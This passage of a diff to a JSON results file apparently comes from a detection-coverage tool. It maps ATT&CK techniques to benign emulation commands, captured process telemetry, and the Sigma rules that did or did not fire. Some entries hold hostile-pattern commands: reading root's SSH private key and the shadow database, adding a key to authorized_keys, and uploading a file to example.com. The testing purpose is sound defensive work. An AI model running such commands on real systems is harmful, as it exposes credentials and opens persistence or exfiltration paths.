+          "why": "'File Deletion' fired on the real captured telemetry - matched on Image."
+        }
       },
       {
         "id": "T1497.001",
@@ -559,7 +1103,29 @@
         ],
         "detected": false,
         "gap_type": "rule",
-        "rule": ""
+        "rule": "",
+        "detail": {
+          "command": "cat /sys/class/dmi/id/product_name 2>/dev/null || true",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c cat /sys/class/dmi/id/product_name 2>/dev/null || true"
+            },
+            {
+              "image": "/usr/bin/cat",
+              "cmd": "cat /sys/class/dmi/id/product_name"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c true"
+            }
+          ],
+          "rule_title": "",
+          "rule_id": "",
+          "rule_path": "",
+          "matched": {},
+          "why": "Telemetry was captured, but no shipped rule is tagged to this technique - a rule gap you can close by writing one Sigma rule."
+        }
       },
       {
         "id": "T1059",
@@ -569,7 +1135,44 @@
         ],
         "detected": true,
         "gap_type": "none",
-        "rule": "8c1a5675-cb85-452f-a298-b01b22a51856"
+        "rule": "8c1a5675-cb85-452f-a298-b01b22a51856",
+        "detail": {
+          "command": "awk 'BEGIN {system(\"/bin/sh -c id\")}'",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c awk 'BEGIN {system(\"/bin/sh -c id\")}'"
+            },
+            {
+              "image": "/usr/bin/mawk",
+              "cmd": "awk BEGIN {system(\"/bin/sh -c id\")}"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c -- /bin/sh -c id"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "/bin/sh -c id"
+            },
+            {
+              "image": "/usr/bin/id",
+              "cmd": "id"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c true"
+            }
+          ],
+          "rule_title": "Suspicious Invocation of Shell via AWK - Linux",
+          "rule_id": "8c1a5675-cb85-452f-a298-b01b22a51856",
+          "rule_path": "rules/sigmahq/proc_creation_lnx_awk_shell_spawn.yml",
+          "matched": {
+            "CommandLine": "awk BEGIN {system(\"/bin/sh -c id\")}",
+            "Image": "/usr/bin/mawk"
+          },
+          "why": "'Suspicious Invocation of Shell via AWK - Linux' fired on the real captured telemetry - matched on CommandLine, Image."
+        }
       },
       {
         "id": "T1059.004",
@@ -579,7 +1182,40 @@
         ],
         "detected": true,
         "gap_type": "none",
-        "rule": "bed978f8-7f3a-432b-82c5-9286a9b3031a"
+        "rule": "bed978f8-7f3a-432b-82c5-9286a9b3031a",
+        "detail": {
+          "command": "env /bin/sh -c id",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c env /bin/sh -c id"
+            },
+            {
+              "image": "/usr/bin/env",
+              "cmd": "env /bin/sh -c id"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "/bin/sh -c id"
+            },
+            {
+              "image": "/usr/bin/id",
+              "cmd": "id"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c true"
+            }
+          ],
+          "rule_title": "Shell Invocation via Env Command - Linux",
+          "rule_id": "bed978f8-7f3a-432b-82c5-9286a9b3031a",
+          "rule_path": "rules/sigmahq/proc_creation_lnx_env_shell_invocation.yml",
+          "matched": {
+            "CommandLine": "env /bin/sh -c id",
+            "Image": "/usr/bin/env"
+          },
+          "why": "'Shell Invocation via Env Command - Linux' fired on the real captured telemetry - matched on CommandLine, Image."
+        }
       },
       {
         "id": "T1059.006",
@@ -589,7 +1225,29 @@
         ],
         "detected": false,
         "gap_type": "base_rate",
-        "rule": ""
+        "rule": "",
+        "detail": {
+          "command": "command -v python3 >/dev/null 2>&1 && python3 -c \"print('redgap')\" || true",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c command -v python3 >/dev/null 2>&1 && python3 -c \"print('redgap')\" || true"
+            },
+            {
+              "image": "/usr/bin/python3.13",
+              "cmd": "python3 -c print('redgap')"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c true"
+            }
+          ],
+          "rule_title": "",
+          "rule_id": "",
+          "rule_path": "",
+          "matched": {},
+          "why": "The signal is real but too common to alert on with a single-event rule - it needs correlation, not a standalone detection."
+        }
       },
       {
         "id": "T1053.003",
@@ -601,7 +1259,40 @@
         ],
         "detected": true,
         "gap_type": "none",
-        "rule": "6b14bac8-3e3a-4324-8109-42f0546a347f"
+        "rule": "6b14bac8-3e3a-4324-8109-42f0546a347f",
+        "detail": {
+          "command": "printf '* * * * * /bin/true\\n' > /tmp/rgcron && crontab /tmp/rgcron || true",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c printf '* * * * * /bin/true\\n' > /tmp/rgcron && crontab /tmp/rgcron || true"
+            },
+            {
+              "image": "/usr/bin/crontab",
+              "cmd": "crontab /tmp/rgcron"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c crontab -r 2>/dev/null; rm -f /tmp/rgcron; true"
+            },
+            {
+              "image": "/usr/bin/crontab",
+              "cmd": "crontab -r"
+            },
+            {
+              "image": "/usr/bin/rm",
+              "cmd": "rm -f /tmp/rgcron"
+            }
+          ],
+          "rule_title": "Scheduled Cron Task/Job - Linux",
+          "rule_id": "6b14bac8-3e3a-4324-8109-42f0546a347f",
+          "rule_path": "rules/sigmahq/proc_creation_lnx_schedule_task_job_cron.yml",
+          "matched": {
+            "CommandLine": "crontab /tmp/rgcron",
+            "Image": "/usr/bin/crontab"
+          },
+          "why": "'Scheduled Cron Task/Job - Linux' fired on the real captured telemetry - matched on CommandLine, Image."
+        }
       },
       {
         "id": "T1053.002",
@@ -613,18 +1304,95 @@
         ],
         "detected": true,
         "gap_type": "none",
-        "rule": "d2d642d7-b393-43fe-bae4-e81ed5915c4b"
+        "rule": "d2d642d7-b393-43fe-bae4-e81ed5915c4b",
+        "detail": {
+          "command": "echo /bin/true | at now + 1 hour || true",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c echo /bin/true | at now + 1 hour || true"
+            },
+            {
+              "image": "/usr/bin/at",
+              "cmd": "at now + 1 hour"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c atq | cut -f1 | xargs -r atrm; true"
+            },
+            {
+              "image": "/usr/bin/at",
+              "cmd": "atq"
+            },
+            {
+              "image": "/usr/bin/xargs",
+              "cmd": "xargs -r atrm"
+            },
+            {
+              "image": "/usr/bin/cut",
+              "cmd": "cut -f1"
+            },
+            {
+              "image": "/usr/bin/at",
+              "cmd": "atrm 1"
+            }
+          ],
+          "rule_title": "Scheduled Task/Job At",
+          "rule_id": "d2d642d7-b393-43fe-bae4-e81ed5915c4b",
+          "rule_path": "rules/sigmahq/proc_creation_lnx_at_command.yml",
+          "matched": {
+            "Image": "/usr/bin/at"
+          },
+          "why": "'Scheduled Task/Job At' fired on the real captured telemetry - matched on Image."
+        }
       },
       {
         "id": "T1548",
         "name": "Abuse Elevation Control Mechanism",
         "tactics": [
           "Privilege Escalation",
-          "Persistence"
+          "Defense Evasion"
         ],
         "detected": true,
         "gap_type": "none",
-        "rule": "ed447910-bc30-4575-a598-3a2e49516a7a"
+        "rule": "ed447910-bc30-4575-a598-3a2e49516a7a",
+        "detail": {
+          "command": "cp /bin/true /tmp/rgcap && setcap cap_setuid+ep /tmp/rgcap || true",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c cp /bin/true /tmp/rgcap && setcap cap_setuid+ep /tmp/rgcap || true"
+            },
+            {
+              "image": "/usr/bin/cp",
+              "cmd": "cp /bin/true /tmp/rgcap"
+            },
+            {
+              "image": "/usr/sbin/setcap",
+              "cmd": "setcap cap_setuid+ep /tmp/rgcap"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c setcap -r /tmp/rgcap 2>/dev/null; rm -f /tmp/rgcap; true"
+            },
+            {
+              "image": "/usr/sbin/setcap",
+              "cmd": "setcap -r /tmp/rgcap"
+            },
+            {
+              "image": "/usr/bin/rm",
+              "cmd": "rm -f /tmp/rgcap"
+            }
+          ],
+          "rule_title": "Linux Setuid Capability Set on a Binary via Setcap Utility",
+          "rule_id": "ed447910-bc30-4575-a598-3a2e49516a7a",
+          "rule_path": "rules/sigmahq/proc_creation_lnx_cap_setuid.yml",
+          "matched": {
+            "CommandLine": "setcap cap_setuid+ep /tmp/rgcap",
+            "Image": "/usr/sbin/setcap"
+          },
+          "why": "'Linux Setuid Capability Set on a Binary via Setcap Utility' fired on the real captured telemetry - matched on CommandLine, Image."
+        }
       },
       {
         "id": "T1546.004",
@@ -635,7 +1403,37 @@
         ],
         "detected": false,
         "gap_type": "base_rate",
-        "rule": ""
+        "rule": "",
+        "detail": {
+          "command": "cp -n /root/.bashrc /root/.bashrc.rgbak; printf '# redgap-benign-test\\n' | tee -a /root/.bashrc >/dev/null || true",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c cp -n /root/.bashrc /root/.bashrc.rgbak; printf '# redgap-benign-test\\n' | tee -a /root/.bashrc >/dev/null || true"
+            },
+            {
+              "image": "/usr/bin/cp",
+              "cmd": "cp -n /root/.bashrc /root/.bashrc.rgbak"
+            },
+            {
+              "image": "/usr/bin/tee",
+              "cmd": "tee -a /root/.bashrc"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c mv -f /root/.bashrc.rgbak /root/.bashrc 2>/dev/null; true"
+            },
+            {
+              "image": "/usr/bin/mv",
+              "cmd": "mv -f /root/.bashrc.rgbak /root/.bashrc"
+            }
+          ],
+          "rule_title": "",
+          "rule_id": "",
+          "rule_path": "",
+          "matched": {},
+          "why": "The signal is real but too common to alert on with a single-event rule - it needs correlation, not a standalone detection."
+        }
       },
       {
         "id": "T1098.004",
@@ -645,7 +1443,41 @@
         ],
         "detected": false,
         "gap_type": "rule",
-        "rule": ""
+        "rule": "",
+        "detail": {
+          "command": "mkdir -p /root/.ssh && printf 'ssh-ed25519 AAAAC3NzREDGAPtest redgap-benign-test\\n' | tee -a /root/.ssh/authorized_keys >/dev/null || true",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c mkdir -p /root/.ssh && printf 'ssh-ed25519 AAAAC3NzREDGAPtest redgap-benign-test\\n' | tee -a /root/.ssh/authorized_keys >/dev/null || true"
+            },
+            {
+              "image": "/usr/bin/mkdir",
+              "cmd": "mkdir -p /root/.ssh"
+            },
+            {
+              "image": "/usr/bin/tee",
+              "cmd": "tee -a /root/.ssh/authorized_keys"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c sed -i '/redgap-benign-test/d' /root/.ssh/authorized_keys 2>/dev/null; rmdir --ignore-fail-on-non-empty /root/.ssh 2>/dev/null; true"
+            },
+            {
+              "image": "/usr/bin/sed",
+              "cmd": "sed -i /redgap-benign-test/d /root/.ssh/authorized_keys"
+            },
+            {
+              "image": "/usr/bin/rmdir",
+              "cmd": "rmdir --ignore-fail-on-non-empty /root/.ssh"
+            }
+          ],
+          "rule_title": "",
+          "rule_id": "",
+          "rule_path": "",
+          "matched": {},
+          "why": "Telemetry was captured, but no shipped rule is tagged to this technique - a rule gap you can close by writing one Sigma rule."
+        }
       },
       {
         "id": "T1552.001",
@@ -655,7 +1487,40 @@
         ],
         "detected": true,
         "gap_type": "none",
-        "rule": "fa4aaed5-4fe0-498d-bbc0-08e3346387ba"
+        "rule": "fa4aaed5-4fe0-498d-bbc0-08e3346387ba",
+        "detail": {
+          "command": "touch /tmp/shadow && cp /tmp/shadow /tmp/shadow.bak",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c touch /tmp/shadow && cp /tmp/shadow /tmp/shadow.bak"
+            },
+            {
+              "image": "/usr/bin/touch",
+              "cmd": "touch /tmp/shadow"
+            },
+            {
+              "image": "/usr/bin/cp",
+              "cmd": "cp /tmp/shadow /tmp/shadow.bak"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c rm -f /tmp/shadow /tmp/shadow.bak"
+            },
+            {
+              "image": "/usr/bin/rm",
+              "cmd": "rm -f /tmp/shadow /tmp/shadow.bak"
+            }
+          ],
+          "rule_title": "Copy Passwd Or Shadow From TMP Path",
+          "rule_id": "fa4aaed5-4fe0-498d-bbc0-08e3346387ba",
+          "rule_path": "rules/sigmahq/proc_creation_lnx_cp_passwd_or_shadow_tmp.yml",
+          "matched": {
+            "CommandLine": "cp /tmp/shadow /tmp/shadow.bak",
+            "Image": "/usr/bin/cp"
+          },
+          "why": "'Copy Passwd Or Shadow From TMP Path' fired on the real captured telemetry - matched on CommandLine, Image."
+        }
       },
       {
         "id": "T1003.008",
@@ -665,7 +1530,29 @@
         ],
         "detected": false,
         "gap_type": "rule",
-        "rule": ""
+        "rule": "",
+        "detail": {
+          "command": "getent shadow || true",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c getent shadow || true"
+            },
+            {
+              "image": "/usr/bin/getent",
+              "cmd": "getent shadow"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c true"
+            }
+          ],
+          "rule_title": "",
+          "rule_id": "",
+          "rule_path": "",
+          "matched": {},
+          "why": "Telemetry was captured, but no shipped rule is tagged to this technique - a rule gap you can close by writing one Sigma rule."
+        }
       },
       {
         "id": "T1552.004",
@@ -675,7 +1562,29 @@
         ],
         "detected": false,
         "gap_type": "rule",
-        "rule": ""
+        "rule": "",
+        "detail": {
+          "command": "cat /root/.ssh/id_rsa 2>/dev/null || true",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c cat /root/.ssh/id_rsa 2>/dev/null || true"
+            },
+            {
+              "image": "/usr/bin/cat",
+              "cmd": "cat /root/.ssh/id_rsa"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c true"
+            }
+          ],
+          "rule_title": "",
+          "rule_id": "",
+          "rule_path": "",
+          "matched": {},
+          "why": "Telemetry was captured, but no shipped rule is tagged to this technique - a rule gap you can close by writing one Sigma rule."
+        }
       },
       {
         "id": "T1560.001",
@@ -685,7 +1594,41 @@
         ],
         "detected": false,
         "gap_type": "rule",
-        "rule": ""
+        "rule": "",
+        "detail": {
+          "command": "tar -czf /tmp/rg_loot.tgz /etc/hostname /etc/os-release 2>/dev/null || true",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c tar -czf /tmp/rg_loot.tgz /etc/hostname /etc/os-release 2>/dev/null || true"
+            },
+            {
+              "image": "/usr/bin/tar",
+              "cmd": "tar -czf /tmp/rg_loot.tgz /etc/hostname /etc/os-release"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "/bin/sh -c gzip"
+            },
+            {
+              "image": "/usr/bin/gzip",
+              "cmd": "gzip"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c rm -f /tmp/rg_loot.tgz"
+            },
+            {
+              "image": "/usr/bin/rm",
+              "cmd": "rm -f /tmp/rg_loot.tgz"
+            }
+          ],
+          "rule_title": "",
+          "rule_id": "",
+          "rule_path": "",
+          "matched": {},
+          "why": "Telemetry was captured, but no shipped rule is tagged to this technique - a rule gap you can close by writing one Sigma rule."
+        }
       },
       {
         "id": "T1005",
@@ -695,7 +1638,29 @@
         ],
         "detected": false,
         "gap_type": "base_rate",
-        "rule": ""
+        "rule": "",
+        "detail": {
+          "command": "cat /etc/hostname || true",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c cat /etc/hostname || true"
+            },
+            {
+              "image": "/usr/bin/cat",
+              "cmd": "cat /etc/hostname"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c true"
+            }
+          ],
+          "rule_title": "",
+          "rule_id": "",
+          "rule_path": "",
+          "matched": {},
+          "why": "The signal is real but too common to alert on with a single-event rule - it needs correlation, not a standalone detection."
+        }
       },
       {
         "id": "T1071.001",
@@ -705,7 +1670,32 @@
         ],
         "detected": true,
         "gap_type": "none",
-        "rule": "b86d356d-6093-443d-971c-9b07db583c68"
+        "rule": "b86d356d-6093-443d-971c-9b07db583c68",
+        "detail": {
+          "command": "curl -A 'RedGap/1.0' http://example.com/ || true",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c curl -A 'RedGap/1.0' http://example.com/ || true"
+            },
+            {
+              "image": "/usr/bin/curl",
+              "cmd": "curl -A RedGap/1.0 http://example.com/"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c true"
+            }
+          ],
+          "rule_title": "Suspicious Curl Change User Agents - Linux",
+          "rule_id": "b86d356d-6093-443d-971c-9b07db583c68",
+          "rule_path": "rules/sigmahq/proc_creation_lnx_susp_curl_useragent.yml",
+          "matched": {
+            "CommandLine": "curl -A RedGap/1.0 http://example.com/",
+            "Image": "/usr/bin/curl"
+          },
+          "why": "'Suspicious Curl Change User Agents - Linux' fired on the real captured telemetry - matched on CommandLine, Image."
+        }
       },
       {
         "id": "T1090",
@@ -715,18 +1705,70 @@
         ],
         "detected": true,
         "gap_type": "none",
-        "rule": "72f4ab3f-787d-495d-a55d-68c2ff46cf4c"
+        "rule": "72f4ab3f-787d-495d-a55d-68c2ff46cf4c",
+        "detail": {
+          "command": "env http_proxy=http://127.0.0.1:3128 true",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c env http_proxy=http://127.0.0.1:3128 true"
+            },
+            {
+              "image": "/usr/bin/env",
+              "cmd": "env http_proxy=http://127.0.0.1:3128 true"
+            },
+            {
+              "image": "/usr/bin/true",
+              "cmd": "true"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c true"
+            }
+          ],
+          "rule_title": "Connection Proxy",
+          "rule_id": "72f4ab3f-787d-495d-a55d-68c2ff46cf4c",
+          "rule_path": "rules/sigmahq/proc_creation_lnx_proxy_connection.yml",
+          "matched": {
+            "CommandLine": "sh -c env http_proxy=http://127.0.0.1:3128 true"
+          },
+          "why": "'Connection Proxy' fired on the real captured telemetry - matched on CommandLine."
+        }
       },
       {
         "id": "T1567",
         "name": "Exfiltration Over Web Service",
         "tactics": [
-          "Exfiltration",
-          "Command and Control"
+          "Exfiltration"
         ],
         "detected": true,
         "gap_type": "none",
-        "rule": "00b90cc1-17ec-402c-96ad-3a8117d7a582"
+        "rule": "00b90cc1-17ec-402c-96ad-3a8117d7a582",
+        "detail": {
+          "command": "curl --upload-file /etc/hostname http://example.com/ || true",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c curl --upload-file /etc/hostname http://example.com/ || true"
+            },
+            {
+              "image": "/usr/bin/curl",
+              "cmd": "curl --upload-file /etc/hostname http://example.com/"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c true"
+            }
+          ],
+          "rule_title": "Suspicious Curl File Upload - Linux",
+          "rule_id": "00b90cc1-17ec-402c-96ad-3a8117d7a582",
+          "rule_path": "rules/sigmahq/proc_creation_lnx_susp_curl_fileupload.yml",
+          "matched": {
+            "CommandLine": "curl --upload-file /etc/hostname http://example.com/",
+            "Image": "/usr/bin/curl"
+          },
+          "why": "'Suspicious Curl File Upload - Linux' fired on the real captured telemetry - matched on CommandLine, Image."
+        }
       },
       {
         "id": "T1048.003",
@@ -736,7 +1778,36 @@
         ],
         "detected": true,
         "gap_type": "none",
-        "rule": "3f0f5957-04f8-4792-ad89-192b0303bde6"
+        "rule": "3f0f5957-04f8-4792-ad89-192b0303bde6",
+        "detail": {
+          "command": "timeout 3 python3 -m http.server 8000 || true",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c timeout 3 python3 -m http.server 8000 || true"
+            },
+            {
+              "image": "/usr/bin/timeout",
+              "cmd": "timeout 3 python3 -m http.server 8000"
+            },
+            {
+              "image": "/usr/bin/python3.13",
+              "cmd": "python3 -m http.server 8000"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c true"
+            }
+          ],
+          "rule_title": "Python WebServer Execution - Linux",
+          "rule_id": "3f0f5957-04f8-4792-ad89-192b0303bde6",
+          "rule_path": "rules/sigmahq/proc_creation_lnx_python_http_server_execution.yml",
+          "matched": {
+            "CommandLine": "python3 -m http.server 8000",
+            "Image": "/usr/bin/python3.13"
+          },
+          "why": "'Python WebServer Execution - Linux' fired on the real captured telemetry - matched on CommandLine, Image."
+        }
       },
       {
         "id": "T1485",
@@ -746,7 +1817,36 @@
         ],
         "detected": true,
         "gap_type": "none",
-        "rule": "2953194b-e33c-4859-b9e8-05948c167447"
+        "rule": "2953194b-e33c-4859-b9e8-05948c167447",
+        "detail": {
+          "command": "dd if=/dev/zero of=/tmp/redgap_wipe bs=1024 count=1",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c dd if=/dev/zero of=/tmp/redgap_wipe bs=1024 count=1"
+            },
+            {
+              "image": "/usr/bin/dd",
+              "cmd": "dd if=/dev/zero of=/tmp/redgap_wipe bs=1024 count=1"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c rm -f /tmp/redgap_wipe"
+            },
+            {
+              "image": "/usr/bin/rm",
+              "cmd": "rm -f /tmp/redgap_wipe"
+            }
+          ],
+          "rule_title": "DD File Overwrite",
+          "rule_id": "2953194b-e33c-4859-b9e8-05948c167447",
+          "rule_path": "rules/sigmahq/proc_creation_lnx_dd_file_overwrite.yml",
+          "matched": {
+            "CommandLine": "dd if=/dev/zero of=/tmp/redgap_wipe bs=1024 count=1",
+            "Image": "/usr/bin/dd"
+          },
+          "why": "'DD File Overwrite' fired on the real captured telemetry - matched on CommandLine, Image."
+        }
       },
       {
         "id": "T1489",
@@ -756,18 +1856,71 @@
         ],
         "detected": true,
         "gap_type": "none",
-        "rule": "de25eeb8-3655-4643-ac3a-b662d3f26b6b"
+        "rule": "de25eeb8-3655-4643-ac3a-b662d3f26b6b",
+        "detail": {
+          "command": "systemctl stop redgap-nonexistent.service || true",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c systemctl stop redgap-nonexistent.service || true"
+            },
+            {
+              "image": "/usr/bin/systemctl",
+              "cmd": "systemctl stop redgap-nonexistent.service"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c true"
+            }
+          ],
+          "rule_title": "Disable Or Stop Services",
+          "rule_id": "de25eeb8-3655-4643-ac3a-b662d3f26b6b",
+          "rule_path": "rules/sigmahq/proc_creation_lnx_services_stop_and_disable.yml",
+          "matched": {
+            "CommandLine": "systemctl stop redgap-nonexistent.service",
+            "Image": "/usr/bin/systemctl"
+          },
+          "why": "'Disable Or Stop Services' fired on the real captured telemetry - matched on CommandLine, Image."
+        }
       },
       {
         "id": "T1653",
         "name": "Power Settings",
         "tactics": [
-          "Persistence",
-          "Impact"
+          "Persistence"
         ],
         "detected": true,
         "gap_type": "none",
-        "rule": "c172b7b5-f3a1-4af2-90b7-822c63df86cb"
+        "rule": "c172b7b5-f3a1-4af2-90b7-822c63df86cb",
+        "detail": {
+          "command": "systemctl mask hibernate.target || true",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c systemctl mask hibernate.target || true"
+            },
+            {
+              "image": "/usr/bin/systemctl",
+              "cmd": "systemctl mask hibernate.target"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c systemctl unmask hibernate.target 2>/dev/null; true"
+            },
+            {
+              "image": "/usr/bin/systemctl",
+              "cmd": "systemctl unmask hibernate.target"
+            }
+          ],
+          "rule_title": "Mask System Power Settings Via Systemctl",
+          "rule_id": "c172b7b5-f3a1-4af2-90b7-822c63df86cb",
+          "rule_path": "rules/sigmahq/proc_creation_lnx_systemctl_mask_power_settings.yml",
+          "matched": {
+            "CommandLine": "systemctl mask hibernate.target",
+            "Image": "/usr/bin/systemctl"
+          },
+          "why": "'Mask System Power Settings Via Systemctl' fired on the real captured telemetry - matched on CommandLine, Image."
+        }
       },
       {
         "id": "T1565.001",
@@ -777,7 +1930,32 @@
         ],
         "detected": true,
         "gap_type": "none",
-        "rule": "86157017-c2b1-4d4a-8c33-93b8e67e4af4"
+        "rule": "86157017-c2b1-4d4a-8c33-93b8e67e4af4",
+        "detail": {
+          "command": "sed -n '1p' /etc/hosts || true",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c sed -n '1p' /etc/hosts || true"
+            },
+            {
+              "image": "/usr/bin/sed",
+              "cmd": "sed -n 1p /etc/hosts"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c true"
+            }
+          ],
+          "rule_title": "Potential Suspicious Change To Sensitive/Critical Files",
+          "rule_id": "86157017-c2b1-4d4a-8c33-93b8e67e4af4",
+          "rule_path": "rules/sigmahq/proc_creation_lnx_susp_sensitive_file_access.yml",
+          "matched": {
+            "CommandLine": "sed -n 1p /etc/hosts",
+            "Image": "/usr/bin/sed"
+          },
+          "why": "'Potential Suspicious Change To Sensitive/Critical Files' fired on the real captured telemetry - matched on CommandLine, Image."
+        }
       },
       {
         "id": "T1592.004",
@@ -787,13 +1965,500 @@
         ],
         "detected": true,
         "gap_type": "none",
-        "rule": "0f79c4d2-4e1f-4683-9c36-b5469a665e06"
+        "rule": "0f79c4d2-4e1f-4683-9c36-b5469a665e06",
+        "detail": {
+          "command": "grep root /etc/sudoers || true",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c grep root /etc/sudoers || true"
+            },
+            {
+              "image": "/usr/bin/grep",
+              "cmd": "grep root /etc/sudoers"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c true"
+            }
+          ],
+          "rule_title": "Access of Sudoers File Content",
+          "rule_id": "0f79c4d2-4e1f-4683-9c36-b5469a665e06",
+          "rule_path": "rules/sigmahq/proc_creation_lnx_susp_process_reading_sudoers.yml",
+          "matched": {
+            "CommandLine": "grep root /etc/sudoers",
+            "Image": "/usr/bin/grep"
+          },
+          "why": "'Access of Sudoers File Content' fired on the real captured telemetry - matched on CommandLine, Image."
+        }
+      },
+      {
+        "id": "T1007",
+        "name": "System Service Discovery",
+        "tactics": [
+          "Discovery"
+        ],
+        "detected": true,
+        "gap_type": "none",
+        "rule": "403ed92c-b7ec-4edd-9947-5b535ee12d46",
+        "detail": {
+          "command": "crontab -l 2>/dev/null || true",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c crontab -l 2>/dev/null || true"
+            },
+            {
+              "image": "/usr/bin/crontab",
+              "cmd": "crontab -l"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c true"
+            }
+          ],
+          "rule_title": "Crontab Enumeration",
+          "rule_id": "403ed92c-b7ec-4edd-9947-5b535ee12d46",
+          "rule_path": "rules/sigmahq/proc_creation_lnx_crontab_enumeration.yml",
+          "matched": {
+            "CommandLine": "crontab -l",
+            "Image": "/usr/bin/crontab"
+          },
+          "why": "'Crontab Enumeration' fired on the real captured telemetry - matched on CommandLine, Image."
+        }
+      },
+      {
+        "id": "T1049",
+        "name": "System Network Connections Discovery",
+        "tactics": [
+          "Discovery"
+        ],
+        "detected": true,
+        "gap_type": "none",
+        "rule": "4c519226-f0cd-4471-bd2f-6fbb2bb68a79",
+        "detail": {
+          "command": "who",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c who"
+            },
+            {
+              "image": "/usr/bin/who",
+              "cmd": "who"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c true"
+            }
+          ],
+          "rule_title": "System Network Connections Discovery - Linux",
+          "rule_id": "4c519226-f0cd-4471-bd2f-6fbb2bb68a79",
+          "rule_path": "rules/sigmahq/proc_creation_lnx_system_network_connections_discovery.yml",
+          "matched": {
+            "Image": "/usr/bin/who"
+          },
+          "why": "'System Network Connections Discovery - Linux' fired on the real captured telemetry - matched on Image."
+        }
+      },
+      {
+        "id": "T1027",
+        "name": "Obfuscated Files or Information",
+        "tactics": [
+          "Defense Evasion"
+        ],
+        "detected": true,
+        "gap_type": "none",
+        "rule": "e2072cab-8c9a-459b-b63c-40ae79e27031",
+        "detail": {
+          "command": "echo cmVkZ2Fw | base64 -d",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c echo cmVkZ2Fw | base64 -d"
+            },
+            {
+              "image": "/usr/bin/base64",
+              "cmd": "base64 -d"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c true"
+            }
+          ],
+          "rule_title": "Decode Base64 Encoded Text",
+          "rule_id": "e2072cab-8c9a-459b-b63c-40ae79e27031",
+          "rule_path": "rules/sigmahq/proc_creation_lnx_base64_decode.yml",
+          "matched": {
+            "CommandLine": "base64 -d",
+            "Image": "/usr/bin/base64"
+          },
+          "why": "'Decode Base64 Encoded Text' fired on the real captured telemetry - matched on CommandLine, Image."
+        }
+      },
+      {
+        "id": "T1036",
+        "name": "Masquerading",
+        "tactics": [
+          "Defense Evasion"
+        ],
+        "detected": true,
+        "gap_type": "none",
+        "rule": "312b42b1-bded-4441-8b58-163a3af58775",
+        "detail": {
+          "command": "cp /bin/true /tmp/rgmasq && /tmp/rgmasq",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c cp /bin/true /tmp/rgmasq && /tmp/rgmasq"
+            },
+            {
+              "image": "/usr/bin/cp",
+              "cmd": "cp /bin/true /tmp/rgmasq"
+            },
+            {
+              "image": "/tmp/rgmasq",
+              "cmd": "/tmp/rgmasq"
